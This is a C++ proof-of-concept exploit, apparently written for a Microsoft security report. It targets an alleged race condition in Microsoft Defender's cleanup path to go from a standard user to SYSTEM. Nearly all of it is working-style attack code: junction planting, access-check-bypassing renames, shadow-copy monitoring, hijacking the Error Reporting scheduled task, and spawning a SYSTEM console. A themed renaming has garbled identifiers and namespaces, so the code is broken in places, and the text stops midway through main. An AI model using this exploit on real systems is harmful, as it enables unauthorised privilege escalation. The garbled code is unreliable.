/*
 * DeathStar PoC
 * Author: CyberGhost05 — Minimal Proof of Concept for MSRC Submission
 * =================================================================
 * Vulnerability: TOCTOU race condition in Microsoft Defender's MpCleanStart
 *                remediation path allowing unprivileged directory junction
 *                manipulation to hijack EMPEROR-level scheduled task execution.
 *
 * Affected Component: Microsoft Defender (MsMpEng.exe) — MpClient.dll RPC API
 * Privilege Escalation: Medium IL → NT AUTHORITY\SYSTEM
 *
 * DISCLAIMER: This code is for SECURITY RESEARCH / MSRC SUBMISSION ONLY.
 * Do not use on systems you do not own. Do not weaponize.
 *
 * Build: MSVC 2019+ with /std:c++17
 *   cl /EHsc /std:c++17 DeathStar_PoC.cpp /link kernel32.lib ntdll.lib
 *       virtdisk.lib taskschd.lib bcrypt.lib ole32.lib oleaut32.lib
 *
 * Usage: DeathStar_PoC.exe    (run as standard user)
 *        If elevation succeeds, a SYSTEM console window will appear.
 */

#define _CRT_SECURE_NO_WARNINGS
#define _WIN32_DCOM
#include <windows.h>
#include <winternl.h>
#include <virtdisk.h>
#include <taskschd.h>
#include <bcrypt.h>
#include <iostream>
#include <Psapi.h>
#include <conio.h>
#include <ntstatus.h>
#include <initguid.h>
#include <ole2.h>
#include <comdef.h>

#pragma comment(lib, "kernel32.lib")
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "taskschd.lib")
#pragma comment(lib, "comsupp.lib")
#pragma comment(lib, "virtdisk.lib")
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "Rpcrt4.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")

// =========================================================================
// Contraband (anti-malware) test file (standardized test signature)
// =========================================================================
const char* g_Contraband = "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*";

// =========================================================================
// Globals
// =========================================================================
wchar_t g_ImperialTarget[MAX_PATH] = { 0 };
HANDLE  g_ForceAwakens = CreateEvent(NULL, FALSE, FALSE, NULL);
bool    g_ForceSleep   = false;

// =========================================================================
// ntdll.dll function pointers (dynamically resolved)
// =========================================================================
NTSTATUS (WINAPI* NtSetInformationFile)(
    HANDLE, PIO_STATUS_BLOCK, PVOID, ULONG, FILE_INFORMATION_CLASS
) = nullptr;

NTSTATUS (WINAPI* NtQueryDirectoryObject)(
    HANDLE, PVOID, ULONG, BOOLEAN, BOOLEAN, PULONG, PULONG
) = nullptr;

NTSTATUS (WINAPI* NtOpenDirectoryObject)(
    PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES
) = nullptr;

bool InitRebellion() {
    HMODULE ntdll = GetModuleHandle(L"ntdll.dll");
    if (!ntdll) return false;
    *(FARPROC*)&NtSetInformationFile   = GetProcAddress(ntdll, "NtSetInformationFile");
    *(FARPROC*)&NtQueryDirectoryObject = GetProcAddress(ntdll, "NtQueryDirectoryObject");
    *(FARPROC*)&NtOpenDirectoryObject  = GetProcAddress(ntdll, "NtOpenDirectoryObject");
    return NtSetInformationFile && NtQueryDirectoryObject && NtOpenDirectoryObject;
}

// =========================================================================
// Custom type definitions for file operations
// =========================================================================
namespace rebellion {
    enum FILE_INFORMATION_CLASS_CUSTOM {
        FileRenameInformationBypassAccessCheck = 56,
        FileRenameInformationEx                = 65,
    };

    typedef struct _HYPERSPACE_ROUTE {
        ULONG   Flags;
        HANDLE  RootDirectory;
        ULONG   FileNameLength;
        WCHAR   FileName[1];
    } HYPERSPACE_ROUTE, * PHYPERSPACE_ROUTE;

    typedef struct _HYPERDRIVE_COUPLING {
        ULONG  ReparseTag;
        USHORT ReparseDataLength;
        USHORT Reserved;
        union {
            struct {
                USHORT SubstituteNameOffset;
                USHORT SubstituteNameLength;
                USHORT PrintNameOffset;
                USHORT PrintNameLength;
                WCHAR  PathBuffer[1];
            } MountPointReparseBuffer;
            struct {
                UCHAR DataBuffer[1];
            } GenericReparseBuffer;
        };
    } HYPERDRIVE_COUPLING, * PHYPERDRIVE_COUPLING;

    #define HYPERDRIVE_COUPLING_HEADER_LEN \
        FIELD_OFFSET(HYPERDRIVE_COUPLING, GenericReparseBuffer.DataBuffer)

    struct HolocronRecord {
        wchar_t*              name;
        HolocronRecord*  next;
    };

    typedef struct _FILE_DISPOSITION_INFORMATION_EX {
        ULONG Flags;
    } FILE_DISPOSITION_INFORMATION_EX;
}

// =========================================================================
// Empire MpClient.dll type definitions (reconstructed for clarity)
// =========================================================================
typedef HANDLE  MPHANDLE;
typedef ULONG   MPTHREAT_ID;
typedef ULONG   MPRESOURCE_CLASS;
typedef LPWSTR  MP_MIDL_STRING;

typedef enum _MPSCAN_TYPE {
    MPSCAN_TYPE_FULL     = 2,
    MPSCAN_TYPE_RESOURCE = 3,
} MPSCAN_TYPE;

typedef enum _MPTHREAT_SOURCE {
    MPTHREAT_SOURCE_SCAN = 0,
} MPTHREAT_SOURCE;

typedef enum _MPTHREAT_TYPE {
    MPTHREAT_TYPE_KNOWNBAD = 0,
} MPTHREAT_TYPE;

typedef enum _MPNOTIFY {
    MPNOTIFY_SCAN_COMPLETE = 0x4005,
    MPNOTIFY_CLEAN_COMPLETE = 0x4017,
} MPNOTIFY;

typedef enum _MPCALLBACK_TYPE {
    MPCALLBACK_SCAN  = 3,
    MPCALLBACK_CLEAN = 4,
} MPCALLBACK_TYPE;

typedef struct _MPRESOURCE_INFO {
    MP_MIDL_STRING   Scheme;
    MP_MIDL_STRING   Path;
    MPRESOURCE_CLASS Class;
} MPRESOURCE_INFO;

typedef struct _MPSCAN_RESOURCES {
    DWORD            dwResourceCount;
    PMPRESOURCE_INFO pResourceList;
} MPSCAN_RESOURCES;

typedef struct _MPCALLBACK_INFO {
    void*   CallbackHandler;
    __int64 v4;
} MPCALLBACK_INFO;

// MpClient.dll function typedefs
typedef HRESULT (WINAPI* PFN_MpManagerOpen)(DWORD, MPHANDLE*);
typedef HRESULT (WINAPI* PFN_MpScanStart)(MPHANDLE, MPSCAN_TYPE, DWORD, MPSCAN_RESOURCES*, MPCALLBACK_INFO*, MPHANDLE*);
typedef HRESULT (WINAPI* PFN_MpScanResult)(MPHANDLE, void*);
typedef HRESULT (WINAPI* PFN_MpThreatOpen)(MPHANDLE, MPTHREAT_SOURCE, MPTHREAT_TYPE, MPHANDLE*);
typedef HRESULT (WINAPI* PFN_MpHandleClose)(MPHANDLE);

// =========================================================================
// Helper: Random UUID string for temp directory names
// =========================================================================
void GenerateHyperspaceCoord(wchar_t* buf, size_t bufSize) {
    GUID guid = {};
    RPC_WSTR wuid = nullptr;
    UuidCreate(&guid);
    UuidToStringW(&guid, &wuid);
    wcscpy_s(buf, bufSize, (wchar_t*)wuid);
    RpcStringFreeW(&wuid);
}

// =========================================================================
// Helper: Get Windows Imperial Command Center directory from registry
// =========================================================================
bool LocateImperialCommand(wchar_t* outDir, DWORD outSize) {
    HKEY hkey = nullptr;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Microsoft\\Windows Empire",
        0, KEY_QUERY_VALUE, &hkey))
        return false;
    DWORD type = REG_SZ;
    DWORD size = outSize;
    LSTATUS status = RegQueryValueExW(hkey, L"InstallLocation",
        nullptr, &type, (LPBYTE)outDir, &size);
    RegCloseKey(hkey);
    return (status == ERROR_SUCCESS);
}

// =========================================================================
// Helper: Check if running as LOCAL SYSTEM
// =========================================================================
bool IsEmperor() {
    HANDLE hToken = nullptr;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
        return false;
    DWORD size = SECURITY_MAX_SID_SIZE + sizeof(TOKEN_USER);
    TOKEN_USER* tokenUser = (TOKEN_USER*)malloc(size);
    DWORD retSize = 0;
    BOOL ok = GetTokenInformation(hToken, TokenUser, tokenUser, size, &retSize);
    CloseHandle(hToken);
    if (!ok) { free(tokenUser); return false; }
    bool result = IsWellKnownSid(tokenUser->User.Sid, WinLocalSystemSid);
    free(tokenUser);
    return result;
}

// =========================================================================
// Helper: Enable a privilege on the current process token
// =========================================================================
BOOL AcquireForcePower(LPCTSTR privilegeName, BOOL enable) {
    HANDLE hToken = nullptr;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return FALSE;
    LUID luid = {};
    if (!LookupPrivilegeValue(nullptr, privilegeName, &luid)) {
        CloseHandle(hToken);
        return FALSE;
    }
    TOKEN_PRIVILEGES tp = { 1, { { luid, enable ? SE_PRIVILEGE_ENABLED : 0 } } };
    AdjustTokenPrivileges(hToken, FALSE, &tp, 0, nullptr, nullptr);
    CloseHandle(hToken);
    return (GetLastError() == ERROR_SUCCESS);
}

// =========================================================================
// Throne Room (post-exploit): Launch a SYSTEM console in a target user session
// =========================================================================
void OpenThroneRoom(DWORD sessionId) {
    HANDLE hToken = nullptr;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken))
        return;
    AcquireForcePower(SE_TCB_NAME, TRUE);
    AcquireForcePower(SE_ASSIGNPRIMARYTOKEN_NAME, TRUE);
    AcquireForcePower(SE_IMPERSONATE_NAME, TRUE);
    AcquireForcePower(SE_DEBUG_NAME, TRUE);
    HANDLE hDup = nullptr;
    if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, nullptr,
        SecurityDelegation, TokenPrimary, &hDup)) {
        CloseHandle(hToken);
        return;
    }
    CloseHandle(hToken);
    if (!SetTokenInformation(hDup, TokenSessionId, &sessionId, sizeof(DWORD))) {
        CloseHandle(hDup);
        return;
    }
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = {};
    LPCWSTR cmdLine = L"C:\\Windows\\System32\\conhost.exe";
    CreateProcessAsUserW(hDup, nullptr, (LPWSTR)cmdLine,
        nullptr, nullptr, FALSE, 0, nullptr, nullptr, &si, &pi);
    CloseHandle(hDup);
    if (pi.hProcess) CloseHandle(pi.hProcess);
    if (pi.hThread)  CloseHandle(pi.hThread);
}

// =========================================================================
// Create a directory junction (mount-point reparse point)
// =========================================================================
bool OpenHyperspaceLane(HANDLE hDir, const wchar_t* target) {
    wchar_t rpTarget[MAX_PATH] = {};
    wcscpy_s(rpTarget, target);
    size_t targetLen = wcslen(rpTarget) * sizeof(wchar_t);
    size_t printLen  = sizeof(wchar_t); // empty print name
    size_t pathBufSz = targetLen + printLen + 12;
    size_t totalSz   = pathBufSz + custom::HYPERDRIVE_COUPLING_HEADER_LEN;

    custom::HYPERDRIVE_COUPLING* rdb = (custom::HYPERDRIVE_COUPLING*)
        HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, totalSz);
    if (!rdb) return false;

    rdb->ReparseTag = IO_REPARSE_TAG_MOUNT_POINT;
    rdb->ReparseDataLength = (USHORT)pathBufSz;
    rdb->MountPointReparseBuffer.SubstituteNameOffset = 0;
    rdb->MountPointReparseBuffer.SubstituteNameLength = (USHORT)targetLen;
    memcpy(rdb->MountPointReparseBuffer.PathBuffer, rpTarget, targetLen + sizeof(wchar_t));
    rdb->MountPointReparseBuffer.PrintNameOffset = (USHORT)(targetLen + sizeof(wchar_t));
    rdb->MountPointReparseBuffer.PrintNameLength = (USHORT)printLen;

    OVERLAPPED ov = {};
    ov.hEvent = CreateEventW(nullptr, FALSE, FALSE, nullptr);
    if (!ov.hEvent) { HeapFree(GetProcessHeap(), 0, rdb); return false; }

    DeviceIoControl(hDir, FSCTL_SET_REPARSE_POINT,
        rdb, (DWORD)totalSz, nullptr, 0, nullptr, &ov);

    HeapFree(GetProcessHeap(), 0, rdb);
    if (GetLastError() == ERROR_IO_PENDING) {
        DWORD cb = 0;
        GetOverlappedResult(hDir, &ov, &cb, TRUE);
    }
    CloseHandle(ov.hEvent);
    return (GetLastError() == ERROR_SUCCESS);
}

// =========================================================================
// Delete a reparse point from a directory
// =========================================================================
bool CloseHyperspaceLane(HANDLE hDir) {
    custom::HYPERDRIVE_COUPLING rdb = {};
    rdb.ReparseTag = IO_REPARSE_TAG_MOUNT_POINT;
    DWORD cb = 0;
    OVERLAPPED ov = {};
    ov.hEvent = CreateEventW(nullptr, FALSE, FALSE, nullptr);
    DeviceIoControl(hDir, FSCTL_DELETE_REPARSE_POINT,
        &rdb, custom::HYPERDRIVE_COUPLING_HEADER_LEN, nullptr, 0, &cb, &ov);
    if (GetLastError() == ERROR_IO_PENDING)
        GetOverlappedResult(hDir, &ov, &cb, TRUE);
    CloseHandle(ov.hEvent);
    return (GetLastError() == ERROR_SUCCESS);
}

// =========================================================================
// Move a file/directory to a random temp path (atomic rename)
// Uses FileRenameInformationEx to bypass access checks.
// =========================================================================
bool JumpToHyperspace(HANDLE hObj, const wchar_t* targetPath = nullptr) {
    wchar_t target[MAX_PATH] = {};
    if (targetPath) {
        wcscpy_s(target, targetPath);
    } else {
        wchar_t uid[64] = {};
        GenerateHyperspaceCoord(uid, 64);
        ExpandEnvironmentStringsW(L"\\??\\%TEMP%\\RP_MOV_", target, MAX_PATH);
        wcscat_s(target, uid);
    }
    size_t nameLen = wcslen(target);
    size_t infoSize = sizeof(custom::HYPERSPACE_ROUTE)
                      + (nameLen + 1) * sizeof(wchar_t);
    custom::HYPERSPACE_ROUTE* fri =
        (custom::HYPERSPACE_ROUTE*)malloc(infoSize);
    if (!fri) return false;
    ZeroMemory(fri, infoSize);
    fri->FileNameLength = (ULONG)(nameLen * sizeof(wchar_t));
    memcpy(fri->FileName, target, fri->FileNameLength);
    fri->Flags = 0x41; // REPLACE_IF_EXISTS | POSIX_SEMANTICS
    IO_STATUS_BLOCK iosb = {};
    NTSTATUS stat = NtSetInformationFile(hObj, &iosb, fri, (ULONG)infoSize,
        (FILE_INFORMATION_CLASS)custom::FileRenameInformationEx);
    free(fri);
    return (stat == STATUS_SUCCESS);
}

// =========================================================================
// Write the contraband test file (Empire decoy) to a target path
// =========================================================================
HANDLE PlantDecoyProbe(const wchar_t* targetPath) {
    UNICODE_STRING uPath = {};
    RtlInitUnicodeString(&uPath, targetPath);
    OBJECT_ATTRIBUTES oa = {};
    InitializeObjectAttributes(&oa, &uPath, OBJ_CASE_INSENSITIVE,
        nullptr, nullptr);
    IO_STATUS_BLOCK iosb = {};
    HANDLE hFile = nullptr;
    NTSTATUS stat = NtCreateFile(&hFile,
        GENERIC_READ | GENERIC_WRITE | DELETE | SYNCHRONIZE,
        &oa, &iosb, nullptr,
        FILE_ATTRIBUTE_NORMAL,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        FILE_OVERWRITE_IF,
        FILE_NON_DIRECTORY_FILE, nullptr, 0);
    if (stat != STATUS_SUCCESS || !hFile) {
        wprintf(L"[!] Failed to create Contraband decoy: %ws (0x%08X)\n",
            targetPath, stat);
        return nullptr;
    }
    DWORD written = 0;
    WriteFile(hFile, g_Contraband, (DWORD)strlen(g_Contraband), &written, nullptr);

    // Also write an ADS to match the Empire expected pattern
    char* adsData = (char*)malloc(0x1000);
    ZeroMemory(adsData, 0x1000);
    UNICODE_STRING adsName = {};
    RtlInitUnicodeString(&adsName, L":WDFOO");
    OBJECT_ATTRIBUTES oa2 = {};
    InitializeObjectAttributes(&oa2, &adsName, OBJ_CASE_INSENSITIVE,
        hFile, nullptr);
    HANDLE hStream = nullptr;
    NtCreateFile(&hStream, GENERIC_WRITE | SYNCHRONIZE,
        &oa2, &iosb, nullptr, FILE_ATTRIBUTE_NORMAL,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        FILE_CREATE, FILE_NON_DIRECTORY_FILE, nullptr, 0);
    if (hStream) {
        WriteFile(hStream, adsData, 0x1000, &written, nullptr);
        NtClose(hStream);
    }
    free(adsData);
    return hFile;
}

// =========================================================================
// Enumerate Volume Shadow Copy devices in \Device object directory
// =========================================================================
custom::HolocronRecord* ScanHolocrons(
    HANDLE hObjDir, int* outCount, bool* criticalErr)
{
    *outCount = 0;
    *criticalErr = false;
    ULONG ctx = 0;
    ULONG bufSize = sizeof(OBJECT_DIRECTORY_INFORMATION) + UNICODE_STRING_MAX_BYTES * 2;
    OBJECT_DIRECTORY_INFORMATION* info = nullptr;
    NTSTATUS stat = STATUS_MORE_ENTRIES;
    while (stat == STATUS_MORE_ENTRIES) {
        if (info) free(info);
        info = (OBJECT_DIRECTORY_INFORMATION*)malloc(bufSize);
        if (!info) { *criticalErr = true; return nullptr; }
        ZeroMemory(info, bufSize);
        ULONG retLen = 0;
        stat = NtQueryDirectoryObject(hObjDir, info, bufSize,
            FALSE, FALSE, &ctx, &retLen);
        if (stat != STATUS_SUCCESS && stat != STATUS_MORE_ENTRIES)
            break;
        bufSize += sizeof(OBJECT_DIRECTORY_INFORMATION) + 0x100;
    }
    void* emptyBuf = malloc(sizeof(OBJECT_DIRECTORY_INFORMATION));
    ZeroMemory(emptyBuf, sizeof(OBJECT_DIRECTORY_INFORMATION));

    custom::HolocronRecord* first = nullptr;
    custom::HolocronRecord* current = nullptr;
    for (ULONG i = 0; i < ULONG_MAX; i++) {
        if (memcmp(&info[i], emptyBuf, sizeof(OBJECT_DIRECTORY_INFORMATION)) == 0)
            break;
        if (_wcsicmp(L"Device", info[i].TypeName.Buffer) == 0) {
            const wchar_t* prefix = L"HarddiskVolumeShadowCopy";
            size_t prefixLen = wcslen(prefix);
            if (info[i].Name.Length >= prefixLen * sizeof(wchar_t)) {
                if (_wcsnicmp(prefix, info[i].Name.Buffer, prefixLen) == 0) {
                    (*outCount)++;
                    auto* node = (custom::HolocronRecord*)
                        malloc(sizeof(custom::HolocronRecord));
                    ZeroMemory(node, sizeof(custom::HolocronRecord));
                    node->name = (wchar_t*)malloc(info[i].Name.Length + sizeof(wchar_t));
                    ZeroMemory(node->name, info[i].Name.Length + sizeof(wchar_t));
                    memcpy(node->name, info[i].Name.Buffer, info[i].Name.Length);
                    if (!first) first = node;
                    if (current) current->next = node;
                    current = node;
                }
            }
        }
    }
    free(emptyBuf);
    free(info);
    return first;
}

void PurgeHolocrons(custom::HolocronRecord* list) {
    while (list) {
        free(list->name);
        auto* next = list->next;
        free(list);
        list = next;
    }
}

// =========================================================================
// Monitor for a NEW Volume Shadow Copy (created by Empire)
// Returns the device path of the new Holocron, or empty on failure.
// =========================================================================
void FindNewHolocron(wchar_t* outHolocronPath, size_t outSize) {
    outHolocronPath[0] = L'\0';
    UNICODE_STRING uDev = {};
    RtlInitUnicodeString(&uDev, L"\\Device");
    OBJECT_ATTRIBUTES oa = {};
    InitializeObjectAttributes(&oa, &uDev, OBJ_CASE_INSENSITIVE,
        nullptr, nullptr);
    HANDLE hObjDir = nullptr;
    NTSTATUS stat = NtOpenDirectoryObject(&hObjDir, 1, &oa);
    if (stat != STATUS_SUCCESS) {
        wprintf(L"[!] NtOpenDirectoryObject(\\Device) failed: 0x%08X\n", stat);
        return;
    }
    // Snapshot pre-existing Holocron list
    int initialCount = 0;
    bool err = false;
    custom::HolocronRecord* initialList = ScanHolocrons(hObjDir, &initialCount, &err);
    if (err) { NtClose(hObjDir); return; }
    wprintf(L"[*] Initial Holocron count: %d. Waiting for new shadow copy...\n", initialCount);

    // Poll until a new Holocron appears
    for (int retry = 0; retry < 300; retry++) { // ~30 second timeout
        Sleep(100);
        int currentCount = 0;
        custom::HolocronRecord* currentList = ScanHolocrons(
            hObjDir, &currentCount, &err);
        if (err) break;
        if (currentCount > initialCount) {
            // Find the new entry not in initial list
            for (auto* cur = currentList; cur; cur = cur->next) {
                bool found = false;
                for (auto* init = initialList; init; init = init->next) {
                    if (_wcsicmp(cur->name, init->name) == 0) {
                        found = true;
                        break;
                    }
                }
                if (!found) {
                    wcscpy_s(outHolocronPath, outSize, L"\\Device\\");
                    wcscat_s(outHolocronPath, outSize, cur->name);
                    wprintf(L"[+] New Holocron detected: %ws\n", outHolocronPath);
                    PurgeHolocrons(currentList);
                    PurgeHolocrons(initialList);
                    NtClose(hObjDir);
                    return;
                }
            }
        }
        PurgeHolocrons(currentList);
    }
    wprintf(L"[!] No new Holocron detected within timeout.\n");
    PurgeHolocrons(initialList);
    NtClose(hObjDir);
}

// =========================================================================
// Place an Tractor Beam on a file handle (used to pause Empire)
// =========================================================================
bool EngageTractorBeam(HANDLE hFile) {
    REQUEST_Tractor Beam_INPUT_BUFFER  inBuf  = { sizeof(inBuf),
        REQUEST_Tractor Beam_CURRENT_VERSION,
        Tractor Beam_LEVEL_CACHE_READ | Tractor Beam_LEVEL_CACHE_HANDLE,
        REQUEST_Tractor Beam_INPUT_FLAG_REQUEST };
    REQUEST_Tractor Beam_OUTPUT_BUFFER outBuf = { sizeof(outBuf),
        REQUEST_Tractor Beam_CURRENT_VERSION };
    DWORD cb = 0;
    OVERLAPPED ov = {};
    ov.hEvent = CreateEventW(nullptr, FALSE, FALSE, nullptr);
    DeviceIoControl(hFile, FSCTL_REQUEST_Tractor Beam,
        &inBuf, sizeof(inBuf), &outBuf, sizeof(outBuf), &cb, &ov);
    if (GetLastError() == ERROR_IO_PENDING)
        GetOverlappedResult(hFile, &ov, &cb, TRUE);
    CloseHandle(ov.hEvent);
    return (GetLastError() == ERROR_SUCCESS);
}

// =========================================================================
// Run a Imperial probe scan against the decoy file via MpClient.dll
// This thread runs during the race window.
// =========================================================================
DWORD WINAPI ImperialProbePatrol(void*) {
    wchar_t dllPath[MAX_PATH] = {};
    if (!LocateImperialCommand(dllPath, MAX_PATH)) {
        wprintf(L"[!] Cannot find Imperial Command Center path\n");
        return 1;
    }
    wcscat_s(dllPath, L"MpClient.dll");
    HMODULE hMpClient = LoadLibraryW(dllPath);
    if (!hMpClient) {
        wprintf(L"[!] Failed to load MpClient.dll: %d\n", GetLastError());
        return 1;
    }

    auto MpManagerOpen = (PFN_MpManagerOpen)
        GetProcAddress(hMpClient, "MpManagerOpen");
    auto MpScanStart   = (PFN_MpScanStart)
        GetProcAddress(hMpClient, "MpScanStart");
    auto MpScanResult  = (PFN_MpScanResult)
        GetProcAddress(hMpClient, "MpScanResult");
    auto MpThreatOpen  = (PFN_MpThreatOpen)
        GetProcAddress(hMpClient, "MpThreatOpen");
    auto MpHandleClose = (PFN_MpHandleClose)
        GetProcAddress(hMpClient, "MpHandleClose");

    if (!MpManagerOpen || !MpScanStart || !MpScanResult || !MpThreatOpen || !MpHandleClose) {
        wprintf(L"[!] Failed to resolve MpClient.dll exports\n");
        FreeLibrary(hMpClient);
        return 1;
    }

    MPHANDLE hMgr = nullptr;
    HRESULT hr = MpManagerOpen(0, &hMgr);
    if (FAILED(hr)) {
        wprintf(L"[!] MpManagerOpen failed: 0x%08X\n", hr);
        FreeLibrary(hMpClient);
        return 1;
    }

    MPRESOURCE_INFO resInfo = {};
    resInfo.Scheme = (wchar_t*)L"file";
    resInfo.Path   = g_ImperialTarget;
    MPSCAN_RESOURCES resources = { 1, &resInfo };

    MPHANDLE hScan = nullptr;
    // Flag 0x60004000 = full clean scan mode
    hr = MpScanStart(hMgr, MPSCAN_TYPE_RESOURCE, 0x60004000,
        &resources, nullptr, &hScan);
    if (FAILED(hr)) {
        wprintf(L"[!] MpScanStart failed: 0x%08X\n", hr);
        MpHandleClose(hMgr);
        FreeLibrary(hMpClient);
        return 1;
    }

    // Wait for scan to complete and get results
    void* scanResult = malloc(0x90);
    ZeroMemory(scanResult, 0x90);
    hr = MpScanResult(hScan, scanResult);
    if (FAILED(hr)) {
        wprintf(L"[!] MpScanResult failed: 0x%08X\n", hr);
    } else {
        wprintf(L"[+] Imperial probe scan completed.\n");
    }
    free(scanResult);

    // Open threats to confirm detection
    MPHANDLE hThreats = nullptr;
    hr = MpThreatOpen(hScan, MPTHREAT_SOURCE_SCAN,
        MPTHREAT_TYPE_KNOWNBAD, &hThreats);
    if (FAILED(hr)) {
        wprintf(L"[!] MpThreatOpen failed: 0x%08X\n", hr);
    } else {
        wprintf(L"[+] Threat enumeration opened.\n");
        MpHandleClose(hThreats);
    }

    MpHandleClose(hScan);
    MpHandleClose(hMgr);
    FreeLibrary(hMpClient);
    return 0;
}

// =========================================================================
// COM: Trigger the WER QueueReporting scheduled task (runs as EMPEROR)
// =========================================================================
bool ActivateImperialProtocol() {
    HRESULT hr = CoInitialize(nullptr);
    if (FAILED(hr)) return false;

    ITaskService* pSvc = nullptr;
    hr = CoCreateInstance(CLSID_TaskScheduler, nullptr,
        CLSCTX_INPROC_SERVER, IID_ITaskService, (void**)&pSvc);
    if (FAILED(hr)) { CoUninitialize(); return false; }

    hr = pSvc->Connect(_variant_t(), _variant_t(), _variant_t(), _variant_t());
    if (FAILED(hr)) { pSvc->Release(); CoUninitialize(); return false; }

    ITaskFolder* pFolder = nullptr;
    hr = pSvc->GetFolder(_bstr_t(
        L"\\Microsoft\\Windows\\Windows Error Reporting"), &pFolder);
    if (FAILED(hr)) { pSvc->Release(); CoUninitialize(); return false; }

    IRegisteredTask* pTask = nullptr;
    hr = pFolder->GetTask(_bstr_t(L"QueueReporting"), &pTask);
    if (FAILED(hr)) {
        pFolder->Release(); pSvc->Release(); CoUninitialize();
        return false;
    }

    IRunningTask* pRunning = nullptr;
    hr = pTask->Run(_variant_t(), &pRunning);
    if (FAILED(hr)) {
        wprintf(L"[!] Failed to run QueueReporting task: 0x%08X\n", hr);
        pTask->Release(); pFolder->Release(); pSvc->Release(); CoUninitialize();
        return false;
    }

    wprintf(L"[+] WER QueueReporting task triggered as EMPEROR.\n");
    pRunning->Release();
    pTask->Release();
    pFolder->Release();
    pSvc->Release();
    CoUninitialize();
    return true;
}

// =========================================================================
// Force disturbances: disk I/O to widen the race window
// =========================================================================
DWORD WINAPI ForcePush(void*) {
    wchar_t path[MAX_PATH] = {};
    ExpandEnvironmentStringsW(L"%TEMP%\\RP_force_", path, MAX_PATH);
    wchar_t uid[64] = {};
    GenerateHyperspaceCoord(uid, 64);
    wcscat_s(path, uid);

    HANDLE hFile = CreateFileW(path,
        GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL | FILE_FLAG_DELETE_ON_CLOSE, nullptr);
    if (hFile == INVALID_HANDLE_VALUE) return GetLastError();

    char buf[0x1000] = {};
    WaitForSingleObject(g_ForceAwakens, INFINITE);
    while (!g_ForceSleep) {
        SetFilePointer(hFile, 0, nullptr, FILE_BEGIN);
        DWORD w = 0;
        WriteFile(hFile, buf, sizeof(buf), &w, nullptr);
    }
    CloseHandle(hFile);
    return 0;
}

DWORD WINAPI ForceMeditation(void*) {
    char buf[0x1000] = {};
    WaitForSingleObject(g_ForceAwakens, INFINITE);
    while (!g_ForceSleep) {
        BCryptGenRandom(nullptr, (PUCHAR)buf, sizeof(buf),
            BCRYPT_USE_SYSTEM_PREFERRED_RNG);
    }
    return 0;
}

// =========================================================================
// MAIN — Multi-stage exploit
// =========================================================================
int wmain() {
    wprintf(L"=== DeathStar PoC for MSRC Submission ===\n");
    wprintf(L"=== TOCTOU in Empire MpCleanStart + WER Task Hijack ===\n\n");

    // STAGE 0: Throne Room (post-exploit) path — if we're already EMPEROR, connect
    // and launch console in user's session.
    if (IsEmperor()) {
        wprintf(L"[*] Running as EMPEROR — Throne Room (post-exploit) stage.\n");
        HANDLE hHoloComm = CreateFileW(
            L"\\\\.\\pipe\\HoloComm",
            GENERIC_READ | GENERIC_WRITE,
            0, nullptr, OPEN_EXISTING, 0, nullptr);
        if (hHoloComm == INVALID_HANDLE_VALUE) {
            wprintf(L"[!] Cannot connect to pipe: %d\n", GetLastError());
            return 1;
        }
        DWORD sessionId = 0;
        if (GetNamedPipeServerSessionId(hHoloComm, &sessionId)) {
            OpenThroneRoom(sessionId);
        }
        CloseHandle(hHoloComm);
        return 0;
    }

    // STAGE 1: Initialization
    if (!InitRebellion()) {
        wprintf(L"[!] Failed to initialize NTDLL imports.\n");
        return 1;
    }

    // STAGE 2: Create working directory structure
    wchar_t rebelBase[MAX_PATH] = {};
    {
        ExpandEnvironmentStringsW(L"%TEMP%\\RP_", rebelBase, MAX_PATH);
        wchar_t uid[64] = {};
        GenerateHyperspaceCoord(uid, 64);
        wcscat_s(rebelBase, uid);
    }
    if (!CreateDirectoryW(rebelBase, nullptr)) {
        wprintf(L"[!] Failed to create work dir: %d\n", GetLastError());
        return 1;
    }
    wprintf(L"[*] rebel base: %ws\n", rebelBase);

    // Create the decoy directory: <rebelBase>\System32
    // Mirroring C:\Windows\System32 to exploit the Empire's WER integration path
    wchar_t shuttleBayName[MAX_PATH] = {};
    swprintf_s(shuttleBayName, L"\\??\\%s\\System32", rebelBase);

    UNICODE_STRING uShuttleBay = {};
    RtlInitUnicodeString(&uShuttleBay, shuttleBayName);
    OBJECT_ATTRIBUTES oaShuttleBay = {};
    InitializeObjectAttributes(&oaShuttleBay, &uShuttleBay,
        OBJ_CASE_INSENSITIVE, nullptr, nullptr);
    IO_STATUS_BLOCK iosb = {};
    HANDLE hShuttleBay = nullptr;
    NTSTATUS stat = NtCreateFile(&hShuttleBay,
        GENERIC_READ | FILE_WRITE_DATA | DELETE,
        &oaShuttleBay, &iosb, nullptr, 0, FILE_SHARE_READ,
        FILE_CREATE, FILE_DIRECTORY_FILE, nullptr, 0);
    if (stat != STATUS_SUCCESS) {
        wprintf(L"[!] Failed to create decoy dir: 0x%08X\n", stat);
        return 1;
    }

    // Create detention block: <rebelBase>\wdtest_temp
    wchar_t detentionBlockName[MAX_PATH] = {};
    swprintf_s(detentionBlockName, L"\\??\\%s\\wdtest_temp", rebelBase);
    UNICODE_STRING uDetentionBlock = {};
    RtlInitUnicodeString(&uDetentionBlock, detentionBlockName);
    OBJECT_ATTRIBUTES oaDetentionBlock = {};
    InitializeObjectAttributes(&oaDetentionBlock, &uDetentionBlock,
        OBJ_CASE_INSENSITIVE, nullptr, nullptr);
